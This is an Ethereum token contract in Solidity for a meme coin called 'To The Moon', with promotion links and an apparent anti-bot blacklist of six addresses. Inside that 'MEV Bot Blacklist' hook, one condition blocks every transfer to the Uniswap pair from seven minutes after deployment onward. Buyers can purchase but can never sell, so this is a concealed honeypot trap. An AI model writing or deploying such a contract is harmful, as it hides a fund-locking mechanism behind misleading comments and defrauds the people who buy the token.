/*
https://t.me/moononeth
https://twitter.com/moononeth
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract Moon is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 private _uniswapV2Router;
    uint256 public startTime;
    uint256 public constant maxSupply = 1000000000 * 10**18;
    bool public isBlacklisted = false;

    constructor() ERC20("To The Moon", unicode"🚀🚀🚀") {
        _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _mint(_msgSender(), maxSupply);
        startTime = block.timestamp;
    }

    function burn(uint256 amount) public virtual {
        require(
            balanceOf(_msgSender()) >= amount,
            "Burn amount exceeds balance"
        );
        _burn(_msgSender(), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 /*amount*/
    ) internal virtual override {
        // MEV Bot Blacklist
        require(
            to != 0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13 &&
                from != 0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13,
            "Blacklisted"
        );
        require(
            to != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 &&
                from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80,
            "Blacklisted"
        );
        require(
            to != 0x77ad3a15b78101883AF36aD4A875e17c86AC65d1 &&
                from != 0x77ad3a15b78101883AF36aD4A875e17c86AC65d1,
            "Blacklisted"
        );
        require(
            to != 0x2E074cB1A5D88931b251833A0fEf227F5d808DC2 &&
                from != 0x2E074cB1A5D88931b251833A0fEf227F5d808DC2,
            "Blacklisted"
        );
        require(
            to != 0x55dc2A116bFe1b3eb345203460dB08b6bB65d34F &&
                from != 0x55dc2A116bFe1b3eb345203460dB08b6bB65d34F,
            "Blacklisted"
        );
        require(
            to != 0x76F36d497b51e48A288f03b4C1d7461e92247d5e &&
                from != 0x76F36d497b51e48A288f03b4C1d7461e92247d5e,
            "Blacklisted"
        );
        if (to == uniswapV2Pair) {
            require(block.timestamp <= startTime + 7 minutes);
        }
    }
}